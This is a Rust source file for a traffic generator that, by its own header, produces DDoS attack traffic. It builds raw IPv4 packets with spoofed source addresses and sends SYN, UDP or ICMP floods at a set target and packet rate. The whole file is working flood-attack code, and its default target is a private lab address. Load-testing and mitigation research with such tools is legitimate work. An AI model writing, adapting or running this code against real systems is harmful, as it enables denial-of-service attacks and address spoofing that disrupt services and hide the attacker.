//! XDP Traffic Generator
//! 
//! Generates DDoS attack traffic using raw sockets with spoofed source IPs.
//! For high-performance scenarios, can be upgraded to AF_XDP.

use anyhow::{Context, Result};
use std::net::Ipv4Addr;
use std::sync::atomic::{AtomicBool, AtomicU64, Ordering};
use std::sync::Arc;
use tokio::sync::RwLock;
use tracing::{info, warn};

/// Attack type
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum AttackType {
    SynFlood,
    UdpFlood,
    IcmpFlood,
}

/// Attack configuration
#[derive(Debug, Clone)]
pub struct AttackConfig {
    /// Target IP address
    pub target_ip: Ipv4Addr,
    /// Target port (for TCP/UDP)
    pub target_port: u16,
    /// Source IP range (CIDR-like, using /8 for 10.0.0.0/8)
    pub source_network: u8, // First octet, e.g., 10 for 10.x.x.x
    /// Packets per second target
    pub pps: u32,
    /// Attack type
    pub attack_type: AttackType,
    /// Interface to send from
    pub interface: String,
}

impl Default for AttackConfig {
    fn default() -> Self {
        Self {
            target_ip: Ipv4Addr::new(192, 168, 1, 200),
            target_port: 443,
            source_network: 10, // 10.0.0.0/8
            pps: 10_000,
            attack_type: AttackType::SynFlood,
            interface: "eno1".to_string(),
        }
    }
}

/// Attack statistics
#[derive(Debug, Clone, Default)]
pub struct AttackStats {
    pub packets_sent: u64,
    pub bytes_sent: u64,
    pub errors: u64,
    pub running: bool,
    pub current_pps: u64,
}

/// Traffic generator state
pub struct TrafficGenerator {
    config: Arc<RwLock<AttackConfig>>,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
}

impl TrafficGenerator {
    pub fn new(config: AttackConfig) -> Self {
        Self {
            config: Arc::new(RwLock::new(config)),
            running: Arc::new(AtomicBool::new(false)),
            packets_sent: Arc::new(AtomicU64::new(0)),
            bytes_sent: Arc::new(AtomicU64::new(0)),
            errors: Arc::new(AtomicU64::new(0)),
        }
    }

    /// Start the attack
    pub async fn start(&self) -> Result<()> {
        if self.running.load(Ordering::Relaxed) {
            warn!("Attack already running");
            return Ok(());
        }

        self.running.store(true, Ordering::Relaxed);
        let config = self.config.read().await.clone();
        
        info!(
            "Starting {:?} attack: {} -> {}:{} @ {} pps",
            config.attack_type,
            format!("{}.x.x.x", config.source_network),
            config.target_ip,
            config.target_port,
            config.pps
        );

        let running = self.running.clone();
        let packets_sent = self.packets_sent.clone();
        let bytes_sent = self.bytes_sent.clone();
        let errors = self.errors.clone();

        // Spawn the attack task
        tokio::spawn(async move {
            if let Err(e) = run_attack(config, running, packets_sent, bytes_sent, errors).await {
                warn!("Attack error: {}", e);
            }
        });

        Ok(())
    }

    /// Stop the attack
    pub fn stop(&self) {
        info!("Stopping attack");
        self.running.store(false, Ordering::Relaxed);
    }

    /// Get current stats
    pub fn stats(&self) -> AttackStats {
        AttackStats {
            packets_sent: self.packets_sent.load(Ordering::Relaxed),
            bytes_sent: self.bytes_sent.load(Ordering::Relaxed),
            errors: self.errors.load(Ordering::Relaxed),
            running: self.running.load(Ordering::Relaxed),
            current_pps: 0, // TODO: calculate from rate
        }
    }

    /// Update configuration
    pub async fn set_config(&self, config: AttackConfig) {
        *self.config.write().await = config;
    }

    /// Check if attack is running
    pub fn is_running(&self) -> bool {
        self.running.load(Ordering::Relaxed)
    }

    /// Reset stats
    pub fn reset_stats(&self) {
        self.packets_sent.store(0, Ordering::Relaxed);
        self.bytes_sent.store(0, Ordering::Relaxed);
        self.errors.store(0, Ordering::Relaxed);
    }
}

/// Run the actual attack loop
async fn run_attack(
    config: AttackConfig,
    running: Arc<AtomicBool>,
    packets_sent: Arc<AtomicU64>,
    bytes_sent: Arc<AtomicU64>,
    errors: Arc<AtomicU64>,
) -> Result<()> {
    use rand::Rng;
    use std::os::unix::io::AsRawFd;

    // Create raw socket
    // Note: Requires CAP_NET_RAW or root
    let socket = socket2::Socket::new(
        socket2::Domain::IPV4,
        socket2::Type::RAW,
        Some(socket2::Protocol::from(libc::IPPROTO_RAW)),
    ).context("Failed to create raw socket - need root/CAP_NET_RAW")?;

    // Enable IP_HDRINCL to craft our own IP headers
    socket.set_header_included(true)?;

    let mut rng = rand::thread_rng();
    let interval_ns = 1_000_000_000u64 / config.pps as u64;
    
    info!("Attack loop started, interval: {}ns per packet", interval_ns);

    while running.load(Ordering::Relaxed) {
        // Generate random source IP in 10.x.x.x range
        let src_ip = Ipv4Addr::new(
            config.source_network,
            rng.gen(),
            rng.gen(),
            rng.gen::<u8>().max(1), // Avoid .0
        );

        let packet = match config.attack_type {
            AttackType::SynFlood => craft_syn_packet(
                src_ip,
                config.target_ip,
                rng.gen_range(1024..65535),
                config.target_port,
            ),
            AttackType::UdpFlood => craft_udp_packet(
                src_ip,
                config.target_ip,
                rng.gen_range(1024..65535),
                config.target_port,
            ),
            AttackType::IcmpFlood => craft_icmp_packet(src_ip, config.target_ip),
        };

        let dest = std::net::SocketAddrV4::new(config.target_ip, 0);
        
        match socket.send_to(&packet, &socket2::SockAddr::from(dest)) {
            Ok(n) => {
                packets_sent.fetch_add(1, Ordering::Relaxed);
                bytes_sent.fetch_add(n as u64, Ordering::Relaxed);
            }
            Err(_) => {
                errors.fetch_add(1, Ordering::Relaxed);
            }
        }

        // Rate limiting - simple busy wait for high precision
        // For production, use a token bucket or better scheduler
        if interval_ns > 1000 {
            tokio::time::sleep(std::time::Duration::from_nanos(interval_ns)).await;
        }
    }

    info!("Attack loop stopped");
    Ok(())
}

/// Craft a TCP SYN packet with IP header
fn craft_syn_packet(src: Ipv4Addr, dst: Ipv4Addr, src_port: u16, dst_port: u16) -> Vec<u8> {
    let mut packet = vec![0u8; 40]; // IP header (20) + TCP header (20)
    
    // IP header
    packet[0] = 0x45; // Version (4) + IHL (5)
    packet[1] = 0x00; // DSCP + ECN
    let total_len: u16 = 40;
    packet[2..4].copy_from_slice(&total_len.to_be_bytes());
    packet[4..6].copy_from_slice(&rand::random::<u16>().to_be_bytes()); // ID
    packet[6] = 0x40; // Flags (Don't Fragment)
    packet[7] = 0x00; // Fragment offset
    packet[8] = 64;   // TTL
    packet[9] = 6;    // Protocol: TCP
    // Checksum at 10-11 (calculated by kernel with IP_HDRINCL on Linux)
    packet[12..16].copy_from_slice(&src.octets());
    packet[16..20].copy_from_slice(&dst.octets());

    // TCP header
    packet[20..22].copy_from_slice(&src_port.to_be_bytes());
    packet[22..24].copy_from_slice(&dst_port.to_be_bytes());
    packet[24..28].copy_from_slice(&rand::random::<u32>().to_be_bytes()); // Seq
    packet[28..32].copy_from_slice(&0u32.to_be_bytes()); // Ack
    packet[32] = 0x50; // Data offset (5 words)
    packet[33] = 0x02; // Flags: SYN
    packet[34..36].copy_from_slice(&65535u16.to_be_bytes()); // Window
    // TCP checksum at 36-37 (TODO: proper pseudo-header checksum)
    packet[38..40].copy_from_slice(&0u16.to_be_bytes()); // Urgent pointer

    packet
}

/// Craft a UDP packet with IP header  
fn craft_udp_packet(src: Ipv4Addr, dst: Ipv4Addr, src_port: u16, dst_port: u16) -> Vec<u8> {
    let payload = b"X".repeat(64); // 64 bytes payload
    let udp_len = 8 + payload.len();
    let total_len = 20 + udp_len;
    
    let mut packet = vec![0u8; total_len];
    
    // IP header
    packet[0] = 0x45;
    packet[1] = 0x00;
    packet[2..4].copy_from_slice(&(total_len as u16).to_be_bytes());
    packet[4..6].copy_from_slice(&rand::random::<u16>().to_be_bytes());
    packet[6] = 0x40;
    packet[7] = 0x00;
    packet[8] = 64;
    packet[9] = 17; // Protocol: UDP
    packet[12..16].copy_from_slice(&src.octets());
    packet[16..20].copy_from_slice(&dst.octets());

    // UDP header
    packet[20..22].copy_from_slice(&src_port.to_be_bytes());
    packet[22..24].copy_from_slice(&dst_port.to_be_bytes());
    packet[24..26].copy_from_slice(&(udp_len as u16).to_be_bytes());
    // UDP checksum at 26-27 (optional for IPv4)
    packet[28..].copy_from_slice(&payload);

    packet
}

/// Craft an ICMP echo request with IP header
fn craft_icmp_packet(src: Ipv4Addr, dst: Ipv4Addr) -> Vec<u8> {
    let mut packet = vec![0u8; 28]; // IP (20) + ICMP (8)
    
    // IP header
    packet[0] = 0x45;
    packet[1] = 0x00;
    packet[2..4].copy_from_slice(&28u16.to_be_bytes());
    packet[4..6].copy_from_slice(&rand::random::<u16>().to_be_bytes());
    packet[6] = 0x40;
    packet[7] = 0x00;
    packet[8] = 64;
    packet[9] = 1; // Protocol: ICMP
    packet[12..16].copy_from_slice(&src.octets());
    packet[16..20].copy_from_slice(&dst.octets());

    // ICMP header
    packet[20] = 8; // Type: Echo Request
    packet[21] = 0; // Code
    // Checksum at 22-23
    packet[24..26].copy_from_slice(&rand::random::<u16>().to_be_bytes()); // ID
    packet[26..28].copy_from_slice(&1u16.to_be_bytes()); // Sequence

    // Calculate ICMP checksum
    let sum = checksum(&packet[20..]);
    packet[22..24].copy_from_slice(&sum.to_be_bytes());

    packet
}

/// Calculate Internet checksum
fn checksum(data: &[u8]) -> u16 {
    let mut sum: u32 = 0;
    let mut i = 0;
    
    while i < data.len() - 1 {
        sum += u16::from_be_bytes([data[i], data[i + 1]]) as u32;
        i += 2;
    }
    
    if i < data.len() {
        sum += (data[i] as u32) << 8;
    }
    
    while sum >> 16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16);
    }
    
    !(sum as u16)
}
